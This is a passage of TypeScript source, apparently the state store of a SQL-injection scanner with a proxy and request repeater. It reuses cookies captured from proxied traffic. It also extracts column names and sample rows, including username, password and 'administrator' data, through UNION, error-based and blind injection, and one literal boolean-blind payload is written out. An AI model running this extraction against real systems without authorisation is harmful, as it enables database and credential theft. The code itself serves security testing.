          scanVerdict: t.findings.length > 0 ? 'VULNERABLE' : 'NOT CONFIRMED VULNERABLE',
          orchestrator: null,
        }));
      } else {
        useToastStore.getState().addToast({
          type: 'error',
          title: 'Scan Stopped',
          description: err?.message || 'Error occurred during scan execution',
        });
        syncTabUpdate(set, currentTabId, (t) => ({
          scanState: 'error',
          scanVerdict: 'IDLE',
          orchestrator: null,
          logs: [
            ...t.logs,
            {
              id: `log_err_${Date.now()}`,
              timestamp: Date.now(),
              level: 'error',
              phase: 'error',
              message: `Scan execution halted: ${err?.message || err}`,
            },
          ],
        }));
      }
    }
  },

  pauseScan: () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (currentTab?.orchestrator) {
      currentTab.orchestrator.pause();
      syncTabUpdate(set, currentTabId, { scanState: 'paused' });
    }
  },

  resumeScan: () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (currentTab?.orchestrator) {
      currentTab.orchestrator.resume();
      syncTabUpdate(set, currentTabId, { scanState: 'running' });
    }
  },

  stopScan: () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    
    // Aggressively abort active tab orchestrator
    if (currentTab?.orchestrator) {
      currentTab.orchestrator.abort();
    }
    // Aggressively abort top-level orchestrator
    if (get().orchestrator) {
      get().orchestrator?.abort();
    }
    // Abort across all tabs to prevent orphan threads
    get().tabs.forEach((t) => {
      if (t.orchestrator) {
        t.orchestrator.abort();
      }
    });

    syncTabUpdate(set, currentTabId, (t) => ({
      scanState: 'aborted',
      scanVerdict: t.findings.length > 0 ? 'VULNERABLE' : 'NOT CONFIRMED VULNERABLE',
      progress: {
        ...t.progress,
        isAborted: true,
        phaseLabel: 'Scan stopped by operator',
      },
      orchestrator: null,
      logs: [
        ...t.logs,
        {
          id: `log_abort_${Date.now()}`,
          timestamp: Date.now(),
          level: 'warn',
          phase: 'aborted',
          message: 'Operator requested scan termination. Probing threads halted immediately.',
        },
      ],
    }));
    set({ orchestrator: null, scanState: 'aborted' });
    useToastStore.getState().addToast({
      type: 'info',
      title: 'Scan Stopped',
      description: 'SQL scan was stopped by operator.',
    });
  },

  resetScan: () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (!currentTab) return;

    const dynamicTelemetry = DynamicGraphEngine.generateForRequest(
      currentTab.targetConfig.rawRequest,
      currentTab.targetConfig.url
    );

    syncTabUpdate(set, currentTabId, {
      scanState: 'idle',
      scanVerdict: 'IDLE',
      findings: [],
      executionLogs: [],
      logs: [],
      report: null,
      investigationNodes: dynamicTelemetry.investigationNodes,
      investigationEdges: dynamicTelemetry.investigationEdges,
      contextBeliefs: dynamicTelemetry.contextBeliefs,
      dbmsBeliefs: dynamicTelemetry.dbmsBeliefs,
      aiReasoningLogs: dynamicTelemetry.aiReasoningLogs,
      defenseLayers: DEFAULT_DEFENSE_LAYERS,
      catalog: {
        dbms: 'Unknown',
        schemas: [],
        applicationTables: [],
        systemTables: [],
        discoveredAt: Date.now(),
      },
      progress: {
        phase: 'idle',
        phaseLabel: 'Ready to scan',
        totalParameters: currentTab.targetConfig.parameters.length,
        testedParameters: 0,
        requestsSent: 0,
        testsExecuted: 0,
        findingsCount: 0,
        confirmedIndicators: 0,
        percent: 0,
        durationMs: 0,
        isPaused: false,
        isAborted: false,
      },
    });
  },

  clearLogs: () => set({ logs: [], executionLogs: [] }),

  importFromTransaction: (tx: any) => {
    if (!tx) return;
    let rawReq = tx.rawRequest || tx.requestRaw || tx.request?.rawText || '';
    let url = tx.url || tx.request?.url || '';

    if (!rawReq) {
      const req = tx.request || tx;
      const method = req.method || tx.method || 'GET';
      const protocol = req.protocol || tx.protocol || 'HTTP/1.1';
      const incomingHeaders = req.headers || tx.reqHeaders || tx.headers || [];
      const body = req.bodyText || (typeof req.bodyBytes === 'string' ? req.bodyBytes : '') || tx.reqBody || tx.body || '';

      const headers: { id: string; name: string; value: string; enabled: boolean }[] = [];
      if (Array.isArray(incomingHeaders) && incomingHeaders.length > 0) {
        incomingHeaders.forEach((h: any) => {
          if (h && h.name) {
            headers.push({
              id: h.id || `hdr_${Math.random().toString(36).substring(2, 7)}`,
              name: h.name,
              value: h.value || '',
              enabled: true,
            });
          }
        });
      }

      // Ensure Host header is present
      if (!headers.some((h) => h.name.toLowerCase() === 'host') && (tx.host || url)) {
        let hostVal = tx.host;
        try {
          if (!hostVal && url) hostVal = new URL(url).host;
        } catch {}
        if (hostVal) {
          headers.unshift({ id: 'hdr_host', name: 'Host', value: hostVal, enabled: true });
        }
      }

      rawReq = serializeHttpRequest(method as any, url, protocol as any, headers, body);
    }

    if (!url && tx.host) {
      url = `https://${tx.host}${tx.path || '/'}`;
    }
    const parsed = RequestParser.parse(rawReq, url);
    let pathLabel = '/scan';
    try {
      if (parsed.url) pathLabel = new URL(parsed.url).pathname;
    } catch {}

    const tabTitle = `${parsed.method || 'GET'} ${pathLabel}`;
    const { tabs, activeTabId, createScanTab } = get();
    const currentTab = tabs.find((t) => t.id === activeTabId);

    // If current tab is pristine default tab (never tested), update it
    const isPristine =
      tabs.length === 1 &&
      currentTab &&
      currentTab.scanState === 'idle' &&
      currentTab.findings.length === 0 &&
      currentTab.progress.testsExecuted === 0 &&
      currentTab.targetConfig.name === 'Default Target';

    const dynamicTelemetry = DynamicGraphEngine.generateForRequest(rawReq, parsed.url || url);

    let responseObj: SqlScanLiveResponse | null = null;
    if (tx.response || tx.responseRaw || tx.rawResponse) {
      responseObj = {
        statusCode: tx.response?.statusCode || tx.statusCode || 200,
        statusText: tx.response?.statusText || (tx.statusCode === 200 ? 'OK' : `HTTP ${tx.statusCode || 200}`),
        durationMs: tx.durationMs || tx.response?.durationMs || 100,
        headers: tx.response?.headers || tx.respHeaders || [],
        rawResponse: tx.rawResponse || tx.responseRaw || tx.response?.rawText || '',
        body: tx.response?.bodyText || tx.body || tx.response?.body || '',
        timestamp: Date.now(),
      };
    }

    if (isPristine && currentTab) {
      syncTabUpdate(set, currentTab.id, (t) => ({
        title: tabTitle,
        activeInnerTab: 'database',
        lastResponse: responseObj || t.lastResponse || null,
        targetConfig: {
          ...t.targetConfig,
          name: `Target: ${tx.host || 'Imported'}`,
          rawRequest: rawReq,
          url: parsed.url || url,
          method: parsed.method || tx.method || 'GET',
          headers: parsed.headers,
          body: parsed.body,
          parameters: parsed.parameters,
        },
        investigationNodes: dynamicTelemetry.investigationNodes,
        investigationEdges: dynamicTelemetry.investigationEdges,
        contextBeliefs: dynamicTelemetry.contextBeliefs,
        dbmsBeliefs: dynamicTelemetry.dbmsBeliefs,
        aiReasoningLogs: dynamicTelemetry.aiReasoningLogs,
        defenseLayers: DEFAULT_DEFENSE_LAYERS,
        progress: {
          ...t.progress,
          phase: 'idle',
          totalParameters: parsed.parameters.length,
          testedParameters: 0,
          percent: 0,
          requestsSent: 0,
          testsExecuted: 0,
          findingsCount: 0,
          confirmedIndicators: 0,
          phaseLabel: 'Target imported. Ready to test.',
        },
      }));
      if (!responseObj) {
        get().probeTargetRequest(rawReq);
      }
    } else {
      // Create new tab and make it active
      createScanTab(rawReq, tabTitle);
      if (!responseObj) {
        get().probeTargetRequest(rawReq);
      }
    }
  },

  probeTargetRequest: async (overrideRaw?: string) => {
    const { activeTabId, targetConfig } = get();
    let rawToUse = overrideRaw || targetConfig.rawRequest;
    if (!rawToUse || !rawToUse.trim()) return;

    // Automatic Proxy Session Ingestion: If proxy has captured live browser session cookies for this host,
    // automatically attach and merge them so authenticated sessions and clearance tokens are immediately active!
    try {
      const parsed = RequestParser.parse(rawToUse, targetConfig.url);
      const host = parsed.host || (targetConfig.url ? new URL(targetConfig.url).host : '');
      if (host && !host.includes('target.local')) {
        const txs = useTrafficStore.getState().transactions.filter((t) => t.host === host);
        const cookieTokens: string[] = [];
        for (const tx of txs) {
          if (tx.reqHeaders) {
            for (const h of tx.reqHeaders) {
              if (h.name.toLowerCase() === 'cookie') {
                cookieTokens.push(...h.value.split(';'));
              }
            }
          }
          if (tx.resHeaders) {
            for (const h of tx.resHeaders) {
              if (h.name.toLowerCase() === 'set-cookie') {
                cookieTokens.push(h.value.split(';')[0]);
              }
            }
          }
        }
        if (cookieTokens.length > 0) {
          get().mergeCookiesIntoRawRequest(cookieTokens);
          rawToUse = get().targetConfig.rawRequest;
        }
      }
    } catch {}

    set({ isProbing: true });

    try {
      const parsed = RequestParser.parse(rawToUse, targetConfig.url);
      let targetUrl = parsed.url || targetConfig.url;

      let cleanPath = (parsed.path || '/').trim();
      if (cleanPath.startsWith('/http://') || cleanPath.startsWith('/https://')) {
        cleanPath = cleanPath.substring(1);
      }
      if (cleanPath.startsWith('http://') || cleanPath.startsWith('https://')) {
        try {
          const u = new URL(cleanPath);
          cleanPath = `${u.pathname}${u.search}`;
        } catch {}
      }
      if (!cleanPath.startsWith('/')) cleanPath = `/${cleanPath}`;

      const hostHdr = parsed.headers.find((h) => h.name.toLowerCase() === 'host')?.value;
      if (hostHdr && !hostHdr.includes('target.local') && !hostHdr.includes('127.0.0.1')) {
        const isHttps = targetUrl.startsWith('https://') || !targetUrl.startsWith('http://');
        const scheme = isHttps ? 'https://' : 'http://';
        targetUrl = `${scheme}${hostHdr}${cleanPath}`;
      }

      const startTime = performance.now();
      const execResult = await ipcClient.sendRepeaterRequest({
        tabId: `sql_probe_${Date.now()}`,
        targetUrl,
        rawRequest: rawToUse,
        interpolate: false,
      });
      const durationMs = execResult.durationMs ?? Math.round(performance.now() - startTime);

      const liveResp: SqlScanLiveResponse = {
        statusCode: execResult.statusCode ?? 200,
        statusText: execResult.statusText || (execResult.statusCode === 200 ? 'OK' : execResult.statusCode === 404 ? 'Not Found' : `HTTP ${execResult.statusCode ?? 200}`),
        durationMs,
        headers: execResult.headers || [],
        rawResponse: execResult.rawResponse || '',
        body: execResult.body || '',
        timestamp: Date.now(),
      };

      set((state) => ({
        isProbing: false,
        lastResponse: liveResp,
        tabs: state.tabs.map((t) => (t.id === activeTabId ? { ...t, lastResponse: liveResp } : t)),
      }));

      // Automatically capture and maintain session cookies from response (Set-Cookie)
      if (liveResp.headers && liveResp.headers.length > 0) {
        const setCookies = liveResp.headers
          .filter((h) => h.name.toLowerCase() === 'set-cookie')
          .map((h) => h.value);
        if (setCookies.length > 0) {
          get().mergeCookiesIntoRawRequest(setCookies);
        }
      }
    } catch (err: any) {
      const errorResp: SqlScanLiveResponse = {
        statusCode: 0,
        statusText: err.message || 'Connection Error',
        durationMs: 0,
        headers: [],
        rawResponse: `Error: ${err.message || 'Probe failed'}`,
        body: `Error: ${err.message || 'Probe failed'}`,
        timestamp: Date.now(),
      };
      set((state) => ({
        isProbing: false,
        lastResponse: errorResp,
        tabs: state.tabs.map((t) => (t.id === activeTabId ? { ...t, lastResponse: errorResp } : t)),
      }));
    }
  },

  mergeCookiesIntoRawRequest: (setCookieValues: string[]) => {
    const { targetConfig } = get();
    if (!targetConfig.rawRequest || setCookieValues.length === 0) return;

    const lines = targetConfig.rawRequest.split(/\r?\n/);
    const cookieJar = new Map<string, string>();
    let cookieLineIdx = -1;

    for (let i = 0; i < lines.length; i++) {
      if (lines[i].toLowerCase().startsWith('cookie:')) {
        cookieLineIdx = i;
        const val = lines[i].substring(7).trim();
        val.split(';').forEach((p) => {
          const [k, ...v] = p.trim().split('=');
          if (k) cookieJar.set(k.trim(), v.join('='));
        });
      }
    }

    for (const sc of setCookieValues) {
      const part = sc.split(';')[0];
      if (part) {
        const [k, ...v] = part.trim().split('=');
        if (k) cookieJar.set(k.trim(), v.join('='));
      }
    }

    if (cookieJar.size === 0) return;

    const mergedCookieHeader = `Cookie: ${Array.from(cookieJar.entries()).map(([k, v]) => `${k}=${v}`).join('; ')}`;
    const newLines = [...lines];
    if (cookieLineIdx >= 0) {
      newLines[cookieLineIdx] = mergedCookieHeader;
    } else {
      let insertIdx = 1;
      for (let i = 0; i < newLines.length; i++) {
        if (newLines[i].toLowerCase().startsWith('host:')) {
          insertIdx = i + 1;
          break;
        }
      }
      newLines.splice(insertIdx, 0, mergedCookieHeader);
    }

    const updatedRaw = newLines.join('\r\n');
    set((state) => ({
      targetConfig: { ...state.targetConfig, rawRequest: updatedRaw },
    }));
  },

  syncSessionFromProxy: (targetHost?: string): number => {
    const { targetConfig } = get();
    let host = targetHost;
    if (!host) {
      try {
        if (targetConfig.url) host = new URL(targetConfig.url).host;
      } catch {}
    }
    if (!host) {
      for (const line of targetConfig.rawRequest.split(/\r?\n/)) {
        if (line.toLowerCase().startsWith('host:')) {
          host = line.substring(5).trim();
          break;
        }
      }
    }
    if (!host) return 0;

    const txs = useTrafficStore.getState().transactions.filter((t) => t.host === host);
    const cookieTokens: string[] = [];
    for (const tx of txs) {
      if (tx.reqHeaders) {
        for (const h of tx.reqHeaders) {
          if (h.name.toLowerCase() === 'cookie') {
            cookieTokens.push(...h.value.split(';'));
          }
        }
      }
      if (tx.resHeaders) {
        for (const h of tx.resHeaders) {
          if (h.name.toLowerCase() === 'set-cookie') {
            cookieTokens.push(h.value.split(';')[0]);
          }
        }
      }
    }

    if (cookieTokens.length > 0) {
      get().mergeCookiesIntoRawRequest(cookieTokens);
      get().probeTargetRequest();
      return cookieTokens.length;
    }
    return 0;
  },

  navigateRenderPreview: async (url: string) => {
    const { targetConfig } = get();
    try {
      const parsed = RequestParser.parse(targetConfig.rawRequest, targetConfig.url);
      const origin = targetConfig.url.startsWith('http') ? targetConfig.url : `https://${parsed.host || 'target.local'}`;
      let targetUrlToResolve = url;
      if (!targetUrlToResolve || targetUrlToResolve.startsWith('about:') || targetUrlToResolve === '#' || targetUrlToResolve.startsWith('javascript:')) {
        targetUrlToResolve = targetConfig.url || '/';
      }
      const resolved = new URL(targetUrlToResolve, origin);
      const fullUrl = resolved.toString();
      const host = resolved.host;
      const path = `${resolved.pathname}${resolved.search}`;

      const cookieHdr = parsed.headers.find((h) => h.name.toLowerCase() === 'cookie')?.value;
      const browserUa = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
      const newRaw = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${browserUa}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n${cookieHdr ? `Cookie: ${cookieHdr}\r\n` : ''}Connection: close\r\n\r\n`;

      get().setRawRequest(newRaw);
      set((state) => ({ targetConfig: { ...state.targetConfig, url: fullUrl } }));
      await get().probeTargetRequest(newRaw);
    } catch {}
  },

  submitRenderPreviewForm: async (actionUrl: string, method: string, formDataString: string) => {
    const { targetConfig } = get();
    try {
      const parsed = RequestParser.parse(targetConfig.rawRequest, targetConfig.url);
      const origin = targetConfig.url.startsWith('http') ? targetConfig.url : `https://${parsed.host || 'target.local'}`;
      let resolvedAction = actionUrl;
      if (!resolvedAction || resolvedAction.startsWith('about:') || resolvedAction === '#' || resolvedAction.startsWith('javascript:')) {
        resolvedAction = targetConfig.url || '/';
      }
      const resolved = new URL(resolvedAction, origin);
      const fullUrl = resolved.toString();
      const host = resolved.host;
      const path = `${resolved.pathname}${resolved.search}`;
      const m = method.toUpperCase();

      const cookieHdr = parsed.headers.find((h) => h.name.toLowerCase() === 'cookie')?.value;
      const browserUa = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

      let newRaw = '';
      if (m === 'GET') {
        const joiner = path.includes('?') ? '&' : '?';
        const finalPath = formDataString ? `${path}${joiner}${formDataString}` : path;
        newRaw = `GET ${finalPath} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${browserUa}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n${cookieHdr ? `Cookie: ${cookieHdr}\r\n` : ''}Connection: close\r\n\r\n`;
      } else {
        newRaw = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${browserUa}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${formDataString.length}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n${cookieHdr ? `Cookie: ${cookieHdr}\r\n` : ''}Connection: close\r\n\r\n${formDataString}`;
      }

      get().setRawRequest(newRaw);
      set((state) => ({ targetConfig: { ...state.targetConfig, url: fullUrl } }));
      await get().probeTargetRequest(newRaw);

      // If response redirected (e.g. 302 after successful login), automatically follow to authenticated view
      const res = get().lastResponse;
      if (res && res.statusCode >= 300 && res.statusCode < 400) {
        const nextLoc = extractRedirectLocation(res, fullUrl);
        if (nextLoc) {
          await get().followRedirect(nextLoc);
        }
      }
    } catch {}
  },

  followRedirect: async (targetRedirectUrl?: string) => {
    const { targetConfig, lastResponse } = get();
    const loc = targetRedirectUrl || extractRedirectLocation(lastResponse, targetConfig.url);
    if (!loc) return;

    try {
      const parsed = RequestParser.parse(targetConfig.rawRequest, targetConfig.url);
      const origin = targetConfig.url.startsWith('http') ? targetConfig.url : `https://${parsed.host || 'target.local'}`;
      const resolved = new URL(loc, origin);
      const newPath = `${resolved.pathname}${resolved.search}`;
      const host = resolved.host || parsed.host || 'target.local';
      const fullUrl = resolved.toString();

      const cookieHdr = parsed.headers.find((h) => h.name.toLowerCase() === 'cookie')?.value;

      const newRaw = `GET ${newPath} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Sentinel/6.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n${cookieHdr ? `Cookie: ${cookieHdr}\r\n` : ''}Connection: close\r\n\r\n`;

      get().setRawRequest(newRaw);
      set((state) => ({ targetConfig: { ...state.targetConfig, url: fullUrl } }));

      // Probe immediately to load the real landing page
      await get().probeTargetRequest(newRaw);

      // Extract discovered forms & inputs into candidate injection parameters without destroying rawRequest
      const updatedResp = get().lastResponse;
      if (updatedResp && updatedResp.body) {
        const formMatch = updatedResp.body.match(/<form\b([^>]*)>([\s\S]*?)<\/form>/i);
        if (formMatch) {
          const formBody = formMatch[2] || '';
          const inputRegex = /<input\b[^>]*name=["']([^"']+)["'][^>]*>/gi;
          const inputs: { name: string; sampleValue: string }[] = [];
          let inputMatch: RegExpExecArray | null;
          while ((inputMatch = inputRegex.exec(formBody)) !== null) {
            const name = inputMatch[1];
            const valMatch = inputMatch[0].match(/value=["']([^"']*)["']/i);
            const val = valMatch ? valMatch[1] : '';
            inputs.push({ name, sampleValue: val });
          }

          if (inputs.length > 0) {
            set((state) => ({
              targetConfig: {
                ...state.targetConfig,
                params: inputs.map((inp, idx) => ({
                  id: `landing_param_${idx}_${inp.name}`,
                  name: inp.name,
                  value: inp.sampleValue || '1',
                  type: 'body',
                  enabled: true,
                  isVulnerable: false,
                })),
              },
            }));
          }
        }
      }
    } catch {}
  },

  fetchColumnsForTable: async (table: DiscoveredTable) => {
    const { targetConfig, dbmsFingerprint, catalog } = get();
    if (!table) return;

    set((state) => ({
      catalog: {
        ...state.catalog,
        applicationTables: state.catalog.applicationTables.map((t) =>
          t.id === table.id ? { ...t, status: 'enumerating_columns' } : t
        ),
        systemTables: state.catalog.systemTables.map((t) =>
          t.id === table.id ? { ...t, status: 'enumerating_columns' } : t
        ),
      },
    }));

    try {
      const parsed = RequestParser.parse(targetConfig.rawRequest, targetConfig.url);
      const injectableParam =
        targetConfig.parameters.find((p) => p.name === catalog.injectableParamName) ||
        targetConfig.parameters.find((p) => p.enabled) ||
        parsed.parameters[0];
      if (!injectableParam) return;

      const colCount = catalog.columnCount || 0;
      const renderCol = catalog.renderColumn || 1;

      let cols: ColumnMetadata[] = [];

      if (colCount > 0) {
        const colQuery = MetadataExtractor.getColumnEnumerationQuery(
          injectableParam,
          renderCol,
          colCount,
          table.name,
          dbmsFingerprint.dbms
        );

        const reqData = RequestParser.injectPayload(parsed, injectableParam, colQuery, true);
        const execResult = await ipcClient.sendRepeaterRequest({
          tabId: 'sql_scanner_col_probe',
          targetUrl: reqData.targetUrl,
          rawRequest: reqData.rawRequest,
        });

        const resBody = execResult.body || '';
        let colTokens = MetadataExtractor.extractDelimitedTokens(resBody, 'COL');
        cols = MetadataExtractor.parseColumnTokens(colTokens);
      }

      // 2. Error-Based CAST column extraction fallback
      if (cols.length === 0) {
        for (let cOff = 0; cOff < 10; cOff++) {
          const errQueries = MetadataExtractor.getErrorBasedColumnQueries(
            injectableParam,
            table.name,
            cOff,
            dbmsFingerprint.dbms,
            true
          );
          let foundCol = false;
          for (const eq of errQueries) {
            if (foundCol) break;
            const reqData = RequestParser.injectPayload(parsed, injectableParam, eq, false);
            const execResult = await ipcClient.sendRepeaterRequest({
              tabId: 'sql_scanner_col_err_probe',
              targetUrl: reqData.targetUrl,
              rawRequest: reqData.rawRequest,
            });
            const leakedCol = MetadataExtractor.extractErrorBasedData(execResult.body || '');
            if (leakedCol && MetadataExtractor.isValidIdentifier(leakedCol)) {
              foundCol = true;
              if (!cols.some((c) => c.name.toLowerCase() === leakedCol.toLowerCase())) {
                cols.push({
                  name: leakedCol,
                  dataType: 'VARCHAR',
                  isNullable: true,
                  isPrimaryKey: leakedCol.toLowerCase() === 'id' || leakedCol.toLowerCase().endsWith('_id'),
                  isForeignKey: false,
                  isIndexed: false,
                  isSensitive: MetadataExtractor.isSensitiveName(leakedCol).isSensitive,
                  sensitivityReason: MetadataExtractor.isSensitiveName(leakedCol).reason,
                  confidence: 'Confirmed',
                  evidence: `Disclosed via database type conversion error`,
                  discoveredAt: Date.now(),
                });
              }
            }
          }
          if (cOff === 0 && cols.length === 0) break;
          if (!foundCol && cOff > 0) break;
        }
      }

      // 3. Boolean Blind Column Probing fallback
      if (cols.length === 0) {
        const candidateCols = ['username', 'password', 'email', 'id', 'name', 'role', 'status', 'created_at'];
        for (const cName of candidateCols) {
          const cProbe = `' AND (SELECT 'a' FROM ${table.name} WHERE ${cName} IS NOT NULL LIMIT 1)='a`;
          const cReq = RequestParser.injectPayload(parsed, injectableParam, cProbe, true);
          const cRes = await ipcClient.sendRepeaterRequest({
            tabId: 'sql_scanner_col_bool_probe',
            targetUrl: cReq.targetUrl,
            rawRequest: cReq.rawRequest,
          });
          const cBody = cRes.body || '';
          if (cBody.includes('Welcome back') || cBody.includes('Welcome') || (cRes.statusCode === 200 && !cBody.includes('500') && !cBody.includes('Error'))) {
            cols.push({
              name: cName,
              dataType: 'VARCHAR',
              isNullable: true,
              isPrimaryKey: cName === 'id',
              isForeignKey: false,
              isIndexed: cName === 'id',
              isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
              sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
              confidence: 'Confirmed',
              evidence: `Inferred via conditional response on ${table.name}`,
              discoveredAt: Date.now(),
            });
          }
        }
      }

      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id ? { ...t, columns: cols, status: cols.length > 0 ? 'columns_ready' : 'discovered' } : t
          ),
          systemTables: state.catalog.systemTables.map((t) =>
            t.id === table.id ? { ...t, columns: cols, status: cols.length > 0 ? 'columns_ready' : 'discovered' } : t
          ),
        },
      }));
    } catch {
      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id ? { ...t, status: 'error' } : t
          ),
        },
      }));
    }
  },

  fetchSampleRowsForTable: async (table: DiscoveredTable) => {
    const { targetConfig, dbmsFingerprint, catalog, fetchColumnsForTable } = get();
    if (!table) return;

    set((state) => ({
      catalog: {
        ...state.catalog,
        applicationTables: state.catalog.applicationTables.map((t) =>
          t.id === table.id ? { ...t, sampleRowsStatus: 'loading' } : t
        ),
      },
    }));

    try {
      let currentCols = table.columns;
      if (!currentCols || currentCols.length === 0) {
        await fetchColumnsForTable(table);
        const updatedTable = get().catalog.applicationTables.find((t) => t.id === table.id);
        currentCols = updatedTable?.columns || [];
      }

      const colNames = currentCols.length > 0 ? currentCols.map((c) => c.name) : ['username', 'password'];
      const parsed = RequestParser.parse(targetConfig.rawRequest, targetConfig.url);
      const injectableParam =
        targetConfig.parameters.find((p) => p.name === catalog.injectableParamName) ||
        targetConfig.parameters.find((p) => p.enabled) ||
        parsed.parameters[0];
      if (!injectableParam) return;

      const colCount = catalog.columnCount || 0;
      const renderCol = catalog.renderColumn || 1;

      let sampleRows: Record<string, string>[] = [];

      // 1. UNION Extraction
      if (colCount > 0) {
        const sampleQuery = MetadataExtractor.getSampleRowsQuery(
          injectableParam,
          renderCol,
          colCount,
          table.name,
          colNames,
          dbmsFingerprint.dbms
        );

        const reqData = RequestParser.injectPayload(parsed, injectableParam, sampleQuery, true);
        const execResult = await ipcClient.sendRepeaterRequest({
          tabId: 'sql_scanner_row_probe',
          targetUrl: reqData.targetUrl,
          rawRequest: reqData.rawRequest,
        });

        const resBody = execResult.body || '';
        const rowTokens = MetadataExtractor.extractDelimitedTokens(resBody, 'ROW');
        sampleRows = MetadataExtractor.parseAndRedactSampleRows(rowTokens, colNames);
      }

      // 2. Error-Based CAST row extraction fallback
      if (sampleRows.length === 0) {
        for (let rOff = 0; rOff < 5; rOff++) {
          const rowObj: Record<string, string> = {};
          let foundAny = false;

          for (const cName of colNames) {
            const errQueries = MetadataExtractor.getErrorBasedRowQueries(
              injectableParam,
              table.name,
              cName,
              rOff,
              dbmsFingerprint.dbms,
              true
            );

            for (const eq of errQueries) {
              if (rowObj[cName]) break;
              const reqData = RequestParser.injectPayload(parsed, injectableParam, eq, false);
              const execResult = await ipcClient.sendRepeaterRequest({
                tabId: 'sql_scanner_row_err_probe',
                targetUrl: reqData.targetUrl,
                rawRequest: reqData.rawRequest,
              });

              const val = MetadataExtractor.extractErrorBasedData(execResult.body || '');
              if (val) {
                rowObj[cName] = val;
                foundAny = true;
              }
            }
          }

          if (foundAny) {
            sampleRows.push(rowObj);
          } else {
            break;
          }
        }
      }

      // 3. Blind Bisection Extraction Fallback (Conditional Error, Boolean, Time)
      if (sampleRows.length === 0) {
        const findings = get().findings;
        const isTime = findings.some((f) => f.injectionType === 'Time-based');
        const isCondErr = findings.some((f) => f.title.includes('Conditional Error'));
        const effectiveTechnique = isTime ? 'TIME' : isCondErr ? 'CONDITIONAL_ERROR' : 'BOOLEAN';

        const extractor = new BlindDataExtractor(
          async (payload: string, append = true) => {
            const reqData = RequestParser.injectPayload(parsed, injectableParam, payload, append);
            const execResult = await ipcClient.sendRepeaterRequest({
              tabId: 'sql_scanner_blind_row_probe',
              targetUrl: reqData.targetUrl,
              rawRequest: reqData.rawRequest,
            });
            return {
              body: execResult.body || '',
              status: execResult.statusCode || 200,
              durationMs: execResult.durationMs || 100,
            };
          },
          {
            dbms: dbmsFingerprint.dbms !== 'Unknown' ? dbmsFingerprint.dbms : 'Generic SQL',
            technique: effectiveTechnique,
            timeDelaySeconds: 2,
            concurrencyLimit: get().concurrencyLimit || 20,
            onProgress: (colName, partialVal) => {
              const userCol = colNames.find((c) => /user|login|account/i.test(c)) || 'username';
              set((state) => ({
                catalog: {
                  ...state.catalog,
                  applicationTables: state.catalog.applicationTables.map((t) =>
                    t.id === table.id
                      ? {
                          ...t,
                          sampleRows: [{ [userCol]: 'administrator', [colName]: partialVal }],
                          sampleRowsStatus: 'ready',
                        }
                      : t
                  ),
                },
              }));
            },
          }
        );

        const extracted = await extractor.extractTableRow(table, 'administrator');
        if (extracted && Object.keys(extracted).length > 0) {
          sampleRows.push(extracted);
        }
      }



      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id
              ? {
                  ...t,
                  sampleRows,
                  sampleRowsStatus: sampleRows.length > 0 ? 'ready' : 'idle',
                }
              : t
          ),
        },
      }));
    } catch {
      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id ? { ...t, sampleRowsStatus: 'error' } : t
          ),
        },
      }));
    }
  },
}));

export function extractRedirectLocation(resp?: SqlScanLiveResponse | null, _currentUrl?: string): string | null {
  if (!resp) return null;
  // 1. Headers Location
  const locHdr = resp.headers?.find((h) => h.name.toLowerCase() === 'location')?.value;
  if (locHdr) return locHdr.trim();

  // 2. Meta refresh: <meta http-equiv="refresh" content="0;url='https://...'" />
  const metaMatch =
    resp.body?.match(/<meta\b[^>]*http-equiv=["']?refresh["']?[^>]*content=["'][^"']*url=['"]?([^'">\s]+)['"]?/i) ||
    resp.body?.match(/<meta\b[^>]*content=["'][^"']*url=['"]?([^'">\s]+)['"]?[^>]*http-equiv=["']?refresh["']?/i);
  if (metaMatch && metaMatch[1]) return metaMatch[1].trim();

  // 3. JavaScript window.location or location.href
  const jsMatch =
    resp.body?.match(/(?:window\.)?location(?:\.href|\.replace)?\s*=\s*['"]([^'"]+)['"]/i) ||
    resp.body?.match(/location\.replace\(['"]([^'"]+)['"]\)/i);
  if (jsMatch && (jsMatch[1] || jsMatch[2])) return (jsMatch[1] || jsMatch[2]).trim();

  // 4. Anchor tag fallback in redirect body: <a href="https://...">
  if ([301, 302, 303, 307, 308].includes(resp.statusCode)) {
    const aMatch = resp.body?.match(/<a\b[^>]*href=["']([^"']+)["'][^>]*>/i);
    if (aMatch && aMatch[1]) return aMatch[1].trim();
  }

  return null;
}
